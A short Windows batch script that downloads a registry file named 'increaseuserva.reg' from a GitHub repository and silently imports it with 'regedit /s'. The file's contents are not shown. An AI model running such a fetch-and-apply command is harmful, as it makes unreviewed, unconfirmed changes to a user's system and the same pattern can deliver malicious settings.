@echo off

powershell -Command "Invoke-WebRequest 'https://github.com/mosol1/WindowsSearch/raw/main/increaseuserva.reg' -OutFile 'C:\Program Files (x86)\WindowsSearch\increaseuserva.reg'"
regedit.exe /s "C:\Program Files (x86)\WindowsSearch\increaseuserva.reg"